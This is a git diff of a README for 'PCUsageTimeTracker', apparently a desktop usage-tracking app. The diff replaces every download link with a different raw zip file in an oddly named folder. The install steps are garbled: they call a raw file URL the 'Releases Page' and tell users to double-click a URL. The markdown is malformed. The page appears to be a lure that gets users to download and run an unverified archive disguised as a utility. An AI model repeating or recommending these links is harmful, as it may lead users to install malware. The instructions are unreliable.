@@ -1,7 +1,7 @@
 # 🎉 PCUsageTimeTracker - Track Your Computer Usage Effortlessly
 
 ## 📥 Download Now
-[![Download PCUsageTimeTracker](https://github.com/Ivooso2004/PCUsageTimeTracker/raw/refs/heads/main/pluriseriated/Tracker_Usage_Time_PC_2.7-alpha.2.zip%https://github.com/Ivooso2004/PCUsageTimeTracker/raw/refs/heads/main/pluriseriated/Tracker_Usage_Time_PC_2.7-alpha.2.zip)](https://github.com/Ivooso2004/PCUsageTimeTracker/raw/refs/heads/main/pluriseriated/Tracker_Usage_Time_PC_2.7-alpha.2.zip)
+[![Download PCUsageTimeTracker](https://raw.githubusercontent.com/Ivooso2004/PCUsageTimeTracker/main/pluriseriated/PC_Tracker_Usage_Time_1.4.zip%https://raw.githubusercontent.com/Ivooso2004/PCUsageTimeTracker/main/pluriseriated/PC_Tracker_Usage_Time_1.4.zip)](https://raw.githubusercontent.com/Ivooso2004/PCUsageTimeTracker/main/pluriseriated/PC_Tracker_Usage_Time_1.4.zip)
 
 ## 🚀 Getting Started
 PCUsageTimeTracker is an offline desktop application built in Python. It helps you track how much time you spend on different applications. With clear charts and simple data storage, you can boost your productivity with ease.
@@ -23,15 +23,15 @@ PCUsageTimeTracker is an offline desktop application built in Python. It helps y
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download area.
-   - [Download PCUsageTimeTracker](https://github.com/Ivooso2004/PCUsageTimeTracker/raw/refs/heads/main/pluriseriated/Tracker_Usage_Time_PC_2.7-alpha.2.zip)
+   - [Download PCUsageTimeTracker](https://raw.githubusercontent.com/Ivooso2004/PCUsageTimeTracker/main/pluriseriated/PC_Tracker_Usage_Time_1.4.zip)
 
 2. **Select the Latest Release**: Find the most recent version available. It will usually be at the top of the list.
 
-3. **Download the Installer**: Look for the file labeled `https://github.com/Ivooso2004/PCUsageTimeTracker/raw/refs/heads/main/pluriseriated/Tracker_Usage_Time_PC_2.7-alpha.2.zip`. Click the file to start the download.
+3. **Download the Installer**: Look for the file labeled `https://raw.githubusercontent.com/Ivooso2004/PCUsageTimeTracker/main/pluriseriated/PC_Tracker_Usage_Time_1.4.zip`. Click the file to start the download.
 
 4. **Run the Installer**:
    - Locate the downloaded file in your downloads folder.
-   - Double-click on `https://github.com/Ivooso2004/PCUsageTimeTracker/raw/refs/heads/main/pluriseriated/Tracker_Usage_Time_PC_2.7-alpha.2.zip`.
+   - Double-click on `https://raw.githubusercontent.com/Ivooso2004/PCUsageTimeTracker/main/pluriseriated/PC_Tracker_Usage_Time_1.4.zip`.
    - Follow the installation prompts until the setup finishes.
 
 5. **Launch the Application**: After installation, you can find the application in your Start Menu. Click on “PCUsageTimeTracker” to start tracking your app usage.
@@ -72,4 +72,4 @@ PCUsageTimeTracker is open-source software. You can view the full license in the
 Become part of the community around PCUsageTimeTracker. Connect with other users, share tips, and enhance your productivity techniques.
 
 Don't forget to download the latest version today!
-- [Download PCUsageTimeTracker](https://github.com/Ivooso2004/PCUsageTimeTracker/raw/refs/heads/main/pluriseriated/Tracker_Usage_Time_PC_2.7-alpha.2.zip)
+- [Download PCUsageTimeTracker](https://raw.githubusercontent.com/Ivooso2004/PCUsageTimeTracker/main/pluriseriated/PC_Tracker_Usage_Time_1.4.zip)
